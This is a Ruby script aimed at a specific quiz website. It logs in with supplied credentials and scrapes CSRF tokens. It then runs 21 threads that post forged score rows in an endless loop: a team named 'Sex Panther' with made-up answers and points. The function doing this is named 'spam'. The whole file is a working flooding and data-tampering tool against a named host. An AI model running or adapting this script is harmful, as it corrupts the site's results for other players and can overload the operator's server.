# frozen_string_literal: true

require 'json'
require 'net/http'

def get(http, uri, cookie)
  request = Net::HTTP::Get.new(uri)
  request['Cookie'] = cookie
  http.request(request)
end

def post(http, uri, cookie)
  request = Net::HTTP::Post.new(uri)
  request['Cookie'] = cookie
  request['X-Csrf-Token'] = new_token(http, cookie)
  request['Content-Type'] = 'application/json'
  request.body = {
    'row': {
      'playerId' => 11,
      'rank' => 1,
      'team' => 'Sex Panther',
      'totalPoints' => 28,
      'question29Answer' => 'asdfasdf',
      'question29Points' => 4,
      'question30Answer' => 'abbb',
      'question30Points' => 7,
      'question31Answer' => 'feckaabv',
      'question31Points' => 10,
      'question32Answer' => 'bass',
      'question32Points' => 8
    }
  }.to_json
  http.request(request)
end

def new_token(http, cookie)
  uri = URI('https://eagsmaster.jimba.li/quiz/7/question/19')
  response = get(http, uri, cookie)
  match = response.body.match(/name="csrf-token" content="(.*)"/)
  match[1]
end

def log_in(http, email, password)
  uri = URI('https://eagsmaster.jimba.li/users/sign_in')
  request = Net::HTTP::Get.new(uri)
  response = http.request(request)
  match = response.body.match(/name="csrf-token" content="(.*)"/)
  token = match[1]
  cookie = response['set-cookie']

  request = Net::HTTP::Post.new(uri)
  request['cookie'] = cookie
  request.set_form_data(
    'authenticity_token' => token,
    'user[email]' => email,
    'user[password]' => password,
    'user[remember_me]' => 1,
    'commit' => 'Log in'
  )
  response = http.request(request)
  response['set-cookie']
end

def spam(email, password)
  uri = URI('https://eagsmaster.jimba.li/quiz/7/question/19')
  # uri = URI('http://eagsmaster.jimba.li/quiz/8/update_progress')

  Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|
    cookie = log_in(http, email, password)

    loop do
      # time = Time.now
      post(http, uri, cookie)
      # puts Time.now - time
      print '.'
    end
  end
end

# Run script

email, password = ARGV[0], ARGV[1]

20.times do
  Thread.new do
    spam(email, password)
  end
end
spam(email, password)
